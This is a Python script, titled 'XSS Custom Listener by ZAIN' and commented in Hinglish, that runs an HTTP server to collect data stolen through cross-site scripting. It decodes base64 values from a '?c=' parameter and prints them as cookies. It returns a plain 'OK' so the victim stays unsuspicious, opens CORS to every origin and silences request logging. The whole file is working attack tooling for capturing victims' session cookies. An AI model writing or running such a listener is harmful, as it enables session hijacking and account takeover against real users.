from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import sys

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Console par request ki details print karna
        print(f"\n\033[94m--- NEW REQUEST FROM {self.client_address[0]} ---\033[0m")
        print(f"Path: {self.path}")
        
        # AUTO DECODER FOR XSS (Base64)
        if "?c=" in self.path:
            try:
                # URL se base64 wala part alag karna aur padding check karna
                encoded_part = self.path.split("?c=")[1].split(" ")[0] # Space handling
                decoded_data = base64.b64decode(encoded_part).decode('utf-8')
                print(f"\033[92m[!!!] DECODED DATA/COOKIE: {decoded_data}\033[0m")
            except Exception as e:
                print(f"\033[93m[!] Could not decode data: {e}\033[0m")

        # BROWSER RESPONSE (Victim ko shaq na ho)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*") # CORS bypass for cross-domain requests
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return # Standard logs ko hide karne ke liye

# --- MAIN EXECUTION ---
print("\033[91mXSS Custom Listener by ZAIN\033[0m")

try:
    # User se port input lena
    user_port = input("Enter Port to listen on (default 9090): ")
    if not user_port:
        port = 9090
    else:
        port = int(user_port)

    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, SimpleHandler)
    
    print(f"\033[92m[*] Listening on 0.0.0.0:{port}...\033[0m")
    print("Waiting for victim to trigger payload (CTRL+C to stop)...\n")
    
    httpd.serve_forever()

except ValueError:
    print("\033[91m[!] Error: Please enter a valid port number.\033[0m")
except KeyboardInterrupt:
    print("\n\033[93m[!] Listener stopped by user.\033[0m")
    sys.exit()
except Exception as e:
    print(f"\033[91m[!] Server Error: {e}\033[0m")